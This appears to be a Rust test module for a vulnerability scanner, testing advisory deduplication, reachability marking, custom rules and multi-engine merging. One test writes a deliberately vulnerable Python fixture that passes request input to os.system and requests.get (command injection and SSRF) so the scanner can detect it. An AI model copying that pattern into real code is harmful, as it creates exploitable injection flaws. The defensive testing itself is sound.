            snippet_start_line: 0,
            cwe: vec![],
            owasp: None,
            cve: cve.iter().map(|s| s.to_string()).collect(),
            references: vec![],
            extra: None,
            package: Some(PackageInfo {
                name: pkg.into(),
                version: ver.into(),
                ecosystem: "crates.io".into(),
                fixed_version: fixed.map(|s| s.into()),
            }),
        }
    }

    #[test]
    fn collapses_the_same_advisory_from_osv_and_cargo_audit() {
        // Both tools cover crates.io and reported the same smallvec bug under
        // different ids, linked by the shared CVE.
        let findings = vec![
            dep_finding(
                "GHSA-43w2-9j62-hq99",
                &["CVE-2021-25900"],
                "smallvec",
                "1.6.0",
                Severity::Critical,
                FindingSource::Osv,
                Some("1.6.1"),
            ),
            dep_finding(
                "RUSTSEC-2021-0003",
                &["CVE-2021-25900"],
                "smallvec",
                "1.6.0",
                Severity::High,
                FindingSource::CargoAudit,
                None,
            ),
        ];
        let out = merge_duplicate_advisories(findings);
        assert_eq!(out.len(), 1, "duplicate advisory was not merged");
        assert_eq!(out[0].severity, Severity::Critical, "worst severity must win");
        assert_eq!(out[0].cve, vec!["CVE-2021-25900"]);
        assert_eq!(
            out[0].package.as_ref().unwrap().fixed_version.as_deref(),
            Some("1.6.1")
        );
    }

    #[test]
    fn merging_keeps_the_concrete_fix_when_the_first_entry_lacks_one() {
        let findings = vec![
            dep_finding(
                "RUSTSEC-2021-0003",
                &["CVE-2021-25900"],
                "smallvec",
                "1.6.0",
                Severity::High,
                FindingSource::CargoAudit,
                None,
            ),
            dep_finding(
                "GHSA-43w2-9j62-hq99",
                &["CVE-2021-25900"],
                "smallvec",
                "1.6.0",
                Severity::High,
                FindingSource::Osv,
                Some("1.6.1"),
            ),
        ];
        let out = merge_duplicate_advisories(findings);
        assert_eq!(out.len(), 1);
        let pkg = out[0].package.as_ref().unwrap();
        assert_eq!(pkg.fixed_version.as_deref(), Some("1.6.1"));
        assert!(out[0].recommendation.contains("1.6.1"));
    }

    #[test]
    fn different_advisories_on_one_package_stay_separate() {
        // hyper 0.14.7 genuinely has more than one advisory; collapsing them
        // would hide real work.
        let findings = vec![
            dep_finding(
                "RUSTSEC-2021-0078",
                &["CVE-2021-32715"],
                "hyper",
                "0.14.7",
                Severity::Medium,
                FindingSource::CargoAudit,
                Some("0.14.10"),
            ),
            dep_finding(
                "RUSTSEC-2021-0079",
                &["CVE-2021-32714"],
                "hyper",
                "0.14.7",
                Severity::Critical,
                FindingSource::CargoAudit,
                Some("0.14.10"),
            ),
        ];
        assert_eq!(merge_duplicate_advisories(findings).len(), 2);
    }

    #[test]
    fn same_advisory_on_different_versions_stays_separate() {
        let findings = vec![
            dep_finding(
                "GHSA-x",
                &["CVE-2021-1"],
                "lodash",
                "4.17.20",
                Severity::High,
                FindingSource::Osv,
                Some("4.17.21"),
            ),
            dep_finding(
                "GHSA-x",
                &["CVE-2021-1"],
                "lodash",
                "3.0.0",
                Severity::High,
                FindingSource::Osv,
                Some("4.17.21"),
            ),
        ];
        assert_eq!(merge_duplicate_advisories(findings).len(), 2);
    }

    #[test]
    fn code_findings_are_never_merged() {
        let mut a = dep_finding("VS-PY-001", &[], "x", "1", Severity::High, FindingSource::Builtin, None);
        a.package = None;
        let mut b = a.clone();
        b.id = "other".into();
        assert_eq!(merge_duplicate_advisories(vec![a, b]).len(), 2);
    }

    #[test]
    fn reachability_marks_findings_on_a_traced_path() {
        // A traced flow whose sink lands on app.py:10, plus a pattern finding on
        // that same line and one on a line the flow never touches.
        let mut flow = dep_finding("VS-FLOW", &[], "x", "1", Severity::High, FindingSource::Builtin, None);
        flow.package = None;
        flow.file = "app.py".into();
        flow.line = 10;
        flow.extra = Some(FindingExtra {
            flow: vec![CombineSpot {
                category: "Приёмник (опасный вызов)".into(),
                line: 10,
                code: "os.system(x)".into(),
                file: None,
            }],
            ..Default::default()
        });

        let mut on_path = dep_finding("VS-PY-001", &[], "x", "1", Severity::High, FindingSource::Builtin, None);
        on_path.package = None;
        on_path.file = "app.py".into();
        on_path.line = 10;

        let mut off_path = on_path.clone();
        off_path.id = "off".into();
        off_path.line = 99;

        let mut findings = vec![flow, on_path, off_path];
        mark_reachable_findings(&mut findings);

        let reachable = |f: &Finding| f.extra.as_ref().map(|e| e.on_data_path).unwrap_or(false);
        assert!(reachable(&findings[1]), "finding on the flow line must be reachable");
        assert!(!reachable(&findings[2]), "finding off the flow must not be");
        // The flow finding itself is the path, not a separately-marked signal.
        assert!(!reachable(&findings[0]));
    }

    fn user_rule(id: &str, pattern: &str, langs: &[&str]) -> userrules::UserRule {
        userrules::UserRule {
            id: id.into(),
            title: "Своё правило".into(),
            description: "d".into(),
            recommendation: "r".into(),
            severity: Severity::High,
            confidence: Confidence::Medium,
            category: "Своё".into(),
            languages: langs.iter().map(|s| s.to_string()).collect(),
            pattern: pattern.into(),
            unless_contains: vec![],
            cwe: vec!["CWE-1".into()],
            owasp: None,
            references: vec![],
            skip_in_tests: false,
            enabled: true,
        }
    }

    #[test]
    fn user_rules_fire_through_the_real_scan_path() {
        let dir = std::env::temp_dir().join("vulnscope-test-userrule");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("app.py");
        std::fs::write(&path, "import os\nbanned_call(1)\nok()\n").unwrap();

        let (compiled, warns) = userrules::compile(&[user_rule("MY-001", r"banned_call\s*\(", &["python"])]);
        assert!(warns.is_empty());

        let (findings, _, _) =
            scan_one_file(&path, "app.py", Language::Python, false, false, false, &compiled, 200, &Default::default()).unwrap();

        let mine: Vec<_> = findings
            .iter()
            .filter(|f| f.source == FindingSource::Custom)
            .collect();
        assert_eq!(mine.len(), 1, "custom rule did not fire");
        assert_eq!(mine[0].rule_id, "MY-001");
        assert_eq!(mine[0].line, 2);
        assert_eq!(mine[0].cwe, vec!["CWE-1"]);
        assert_eq!(mine[0].source_label, "Своё правило");
        assert!(!mine[0].snippet.is_empty());

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn user_rules_respect_language_scope_and_comments() {
        let dir = std::env::temp_dir().join("vulnscope-test-userrule-scope");
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();

        // Commented-out hit must be ignored, exactly like a built-in rule.
        let py = dir.join("a.py");
        std::fs::write(&py, "# banned_call(1)\n").unwrap();
        let (compiled, _) = userrules::compile(&[user_rule("MY-001", r"banned_call\s*\(", &["python"])]);
        let (findings, _, _) = scan_one_file(&py, "a.py", Language::Python, false, false, false, &compiled, 200, &Default::default()).unwrap();
        assert!(findings.iter().all(|f| f.source != FindingSource::Custom));

        // A python-scoped rule must not fire on Rust.
        let rs = dir.join("b.rs");
        std::fs::write(&rs, "fn f() { banned_call(1); }\n").unwrap();
        let (findings, _, _) = scan_one_file(&rs, "b.rs", Language::Rust, false, false, false, &compiled, 200, &Default::default()).unwrap();
        assert!(findings.iter().all(|f| f.source != FindingSource::Custom));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn experimental_combination_is_synthesized() {
        let dir = std::env::temp_dir().join(format!("vs-combo-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("chain.py");
        // Two distinct amplifying vectors driven by request input: command
        // injection and SSRF. Together they should trip the combination pass.
        std::fs::write(
            &path,
            "import os, requests\n\
             os.system(request.args.get('cmd'))\n\
             requests.get(request.args.get('url'))\n",
        )
        .unwrap();

        let (findings, _, _) =
            scan_one_file(&path, "chain.py", Language::Python, false, true, false, &[], 200, &Default::default()).unwrap();
        let combo = findings
            .iter()
            .find(|f| f.rule_id == "VS-EXP-COMBO")
            .expect("combination should be synthesized");
        assert_eq!(combo.severity, Severity::Critical);
        let ex = combo.extra.as_ref().unwrap();
        assert!(ex.experimental && ex.combination);
        assert!(
            ex.combine_spots.len() >= 2,
            "should link >= 2 vectors: {:?}",
            ex.combine_spots
        );
        // Each spot carries the actual source line, not just a label.
        assert!(ex.combine_spots.iter().all(|s| !s.code.is_empty()));
        // Aggregated CWE list goes beyond the generic chain tag.
        assert!(combo.cwe.len() >= 2, "should aggregate component CWEs: {:?}", combo.cwe);
        // Command injection + SSRF is a recognised named chain.
        assert!(combo.title.contains("SSRF"), "named chain title: {}", combo.title);

        // With the experimental pass off, no combination is emitted.
        let (plain, _, _) =
            scan_one_file(&path, "chain.py", Language::Python, false, false, false, &[], 200, &Default::default()).unwrap();
        assert!(!plain.iter().any(|f| f.rule_id == "VS-EXP-COMBO"));

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn merges_same_issue_from_several_engines() {
        let mk = |src: FindingSource, label: &str, cwe: &str, sev: Severity| Finding {
            id: format!("{label}:app.py:10"),
            fingerprint: String::new(),
            suppressed: false,
            suppression_reason: None,
            is_new: false,
            rule_id: "R".into(),
            title: "Command injection".into(),
            description: "d".into(),
            recommendation: "r".into(),
            severity: sev,
            confidence: Confidence::Medium,
            source: src,
            source_label: label.into(),
            category: "Инъекция команд".into(),
            file: "app.py".into(),
            line: 10,
            end_line: 10,
            column: 0,
            end_column: 0,
            snippet: String::new(),
            snippet_start_line: 10,
            cwe: vec![cwe.into()],
            owasp: None,
            cve: Vec::new(),
            references: Vec::new(),
            extra: None,
            package: None,
        };
        // Three engines flag the same line + CWE; a fourth flags a different CWE.
        let input = vec![
            mk(FindingSource::Semgrep, "Semgrep", "CWE-78", Severity::Medium),
            mk(FindingSource::Bandit, "Bandit", "CWE-78", Severity::High),
            mk(FindingSource::Builtin, "Встроенные правила", "CWE-78", Severity::Medium),
            mk(FindingSource::Gosec, "gosec", "CWE-89", Severity::Low),
        ];
        let out = merge_duplicate_code_findings(input);
        // The three CWE-78 rows collapse into one; the CWE-89 row stays.
        assert_eq!(out.len(), 2);
        let merged = out.iter().find(|f| f.cwe.contains(&"CWE-78".to_string())).unwrap();
        assert_eq!(merged.severity, Severity::High, "worst severity wins");
        assert!(merged.source_label.contains("Semgrep"));
        assert!(merged.source_label.contains("Bandit"));
        assert!(merged.source_label.contains("Встроенные правила"));
    }

    #[test]
    fn severity_counts_roll_up() {
        let mut c = SeverityCounts::default();
        c.add(Severity::Critical);
        c.add(Severity::Critical);
        c.add(Severity::Low);
        assert_eq!(c.critical, 2);
        assert_eq!(c.low, 1);
        assert_eq!(c.total(), 3);
    }
}
